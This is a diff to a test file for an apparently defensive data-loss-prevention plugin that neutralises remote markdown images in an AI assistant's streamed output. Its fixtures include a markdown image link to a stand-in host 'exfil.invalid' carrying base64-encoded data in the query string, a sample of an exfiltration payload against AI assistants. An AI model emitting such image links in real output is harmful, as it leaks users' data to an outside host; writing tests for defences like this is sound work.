@@ -17,6 +17,7 @@ import type {
   ToolExecution,
   ToolExecutionResult,
 } from '@deepseek-ai/dsh-tools'
+import type { GenerateOptions, StreamChunk } from '@deepseek-ai/dsh-llm'
 import type { Session, SessionEvent } from '@deepseek-ai/dsh-session'
 import type { SessionTelemetryRecord } from '@deepseek-ai/dsh-session-telemetry'
 import { apply, loadOrCreateKey } from '../../src/index.ts'
@@ -87,6 +88,7 @@ function mount(overrides: Partial<Config> = {}): StubContext & { auditLog: strin
     breadthTier: true,
     resultRedaction: true,
     telemetryRedaction: true,
+    remoteImageNeutralization: true,
     redactTelemetryWorkspacePaths: true,
     ...overrides,
   })
@@ -582,6 +584,7 @@ describe('this plugin\'s own files', () => {
       breadthTier: false,
       resultRedaction: false,
       telemetryRedaction: false,
+      remoteImageNeutralization: false,
       redactTelemetryWorkspacePaths: false,
     })
 
@@ -653,5 +656,47 @@ describe('the plugin manifest', () => {
     expect(module.name).toBe('dsh-dlp')
     expect(module.inject).toEqual(['tools'])
     expect(vi.isMockFunction(module.apply)).toBe(false)
+  })
+})
+
+describe('the remote-image registration', () => {
+  it('records the host of a neutralised destination, and nothing else about it', async () => {
+    const plugin = mount()
+    const listener = plugin.listeners.get('llm/stream')?.[0] as
+      (options: GenerateOptions, next: () => AsyncIterable<StreamChunk>) => AsyncIterable<StreamChunk>
+    const text = '![receipt](https://exfil.invalid/p?d=c2VjcmV0)'
+
+    const seen: StreamChunk[] = []
+    for await (const chunk of listener(
+      { sessionId: 'session-7' } as unknown as GenerateOptions,
+      async function* () {
+        yield { type: 'block-end', index: 0, block: { type: 'text', text } } satisfies StreamChunk
+      },
+    )) seen.push(chunk)
+
+    expect(JSON.stringify(seen)).not.toContain('c2VjcmV0')
+    expect(plugin.records()[0]).toMatchObject({
+      kind: 'assistant-image-neutralized',
+      host: 'exfil.invalid',
+      sessionId: 'session-7',
+    })
+    expect(JSON.stringify(plugin.records())).not.toContain('/p?d=')
+  })
+
+  it('records a call that carries no session id, which a hand-built request does not', async () => {
+    const plugin = mount()
+    const listener = plugin.listeners.get('llm/stream')?.[0] as
+      (options: GenerateOptions, next: () => AsyncIterable<StreamChunk>) => AsyncIterable<StreamChunk>
+
+    for await (const _chunk of listener({} as unknown as GenerateOptions, async function* () {
+      yield { type: 'text-delta', index: 0, text: '![a](https://exfil.invalid/a.png) ' } satisfies StreamChunk
+    })) void _chunk
+
+    expect(plugin.records()[0]).toMatchObject({ kind: 'assistant-image-neutralized', host: 'exfil.invalid' })
+    expect(plugin.records()[0]?.['sessionId']).toBeUndefined()
+  })
+
+  it('is absent when the deployment turns it off', () => {
+    expect(mount({ remoteImageNeutralization: false }).listeners.has('llm/stream')).toBe(false)
   })
 })
